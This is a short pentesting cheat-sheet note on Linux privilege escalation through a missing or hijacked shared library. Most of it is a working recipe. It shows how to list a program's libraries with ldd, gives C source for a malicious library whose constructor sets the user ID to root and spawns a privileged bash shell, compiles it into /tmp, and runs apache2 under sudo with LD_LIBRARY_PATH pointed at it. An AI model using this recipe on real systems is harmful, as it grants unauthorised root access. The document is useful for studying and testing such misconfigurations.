- - -
Sometimes The programs is owned by privileged users but and we have permissions to run them but sometimes some libraries were missing...We can abuse this error or misconfuguration 
to escalate our privileges !! 

Great Link : [here](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)

## Investigation : 

Run **ldd** command against the Suspected program file to see which shared libraries are used by the program : 

```sh
ldd /Full/Path/To/Program
```

Then Just create this file : 

```c 
#include <stdio.h>  
#include <stdlib.h>  
  
static void hijack() __attribute__((constructor));  
  
void hijack() {  
	unsetenv("LD_LIBRARY_PATH");  
	setresuid(0,0,0);  
	system("/bin/bash -p");  
}


/* // Or Use this :- 
#include<stdio.h>  
#include<stdlib.h>  
#include<unistd.h>int welcome(){  
setuid(0);  
setgid(0);  
system(“/bin/bash”);  
}
*/


```

Select any of the Library and replace it with the under file below : 

```sh
gcc -o /tmp/linux-vdso.so.1 -shared -fPIC <path to your above.c file>
```

Now run it : 

```sh
sudo LD_LIBRARY_PATH=/tmp apache2
```

- - -
